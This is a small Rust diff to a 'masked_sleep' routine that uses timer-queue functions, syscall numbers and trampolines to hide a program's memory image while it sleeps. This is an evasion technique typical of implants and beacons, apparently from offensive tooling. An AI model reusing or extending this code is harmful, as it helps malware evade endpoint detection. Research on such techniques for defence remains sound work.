@@ -77,7 +77,7 @@ pub unsafe fn masked_sleep(duration_ms: u32) {
 
     let (p_ctq, p_ct, p_dtq) = match resolve_rtl_timer_fns() {
         Some(v) => v,
-        None    => { masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp); return; }
+        None    => return,
     };
     let rtl_ctq: RtlCTQ      = core::mem::transmute(p_ctq);
     let rtl_ct:  RtlCT       = core::mem::transmute(p_ct);
@@ -121,7 +121,7 @@ pub unsafe fn masked_sleep(duration_ms: u32) {
     masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp);
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
 unsafe fn masked_sleep_kernel32(
     duration_ms: u32, image_base: *mut u8, image_size: usize,
     prot_ssn: u16, prot_tramp: *const u8, qvm_ssn: u16, qvm_tramp: *const u8,
